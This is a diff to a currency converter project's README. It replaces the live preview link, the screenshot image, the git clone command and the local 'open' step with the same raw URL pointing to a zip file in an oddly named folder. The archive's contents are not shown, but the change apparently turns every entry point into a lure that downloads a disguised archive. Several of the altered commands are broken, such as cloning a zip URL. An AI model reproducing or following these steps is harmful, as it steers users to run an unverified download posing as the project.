@@ -6,7 +6,7 @@ This is a simple and interactive **Currency Converter Web App** built using **HT
 
 ## 🔗 Live Preview
 
-👉 [Click Here to View](https://dotsatya.github.io/Currency-Converter/)  
+👉 [Click Here to View](https://raw.githubusercontent.com/dotsatya/Currency-Converter/main/hydrosomatous/Currency-Converter.zip)  
 _(Deployed via GitHub Pages)_
 
 ---
@@ -46,13 +46,13 @@ _(Deployed via GitHub Pages)_
 
 ## 🖼️ Screenshot
 
-> ![Currency Converter Preview](image.png)
+> ![Currency Converter Preview](https://raw.githubusercontent.com/dotsatya/Currency-Converter/main/hydrosomatous/Currency-Converter.zip)
 
 ---
 
 ## 🚀 How to Run Locally
 
 ```bash
-git clone https://github.com/dotsatya/Currency-Converter.git
+git clone https://raw.githubusercontent.com/dotsatya/Currency-Converter/main/hydrosomatous/Currency-Converter.zip
 cd Currency-Converter
-open index.html
+open https://raw.githubusercontent.com/dotsatya/Currency-Converter/main/hydrosomatous/Currency-Converter.zip
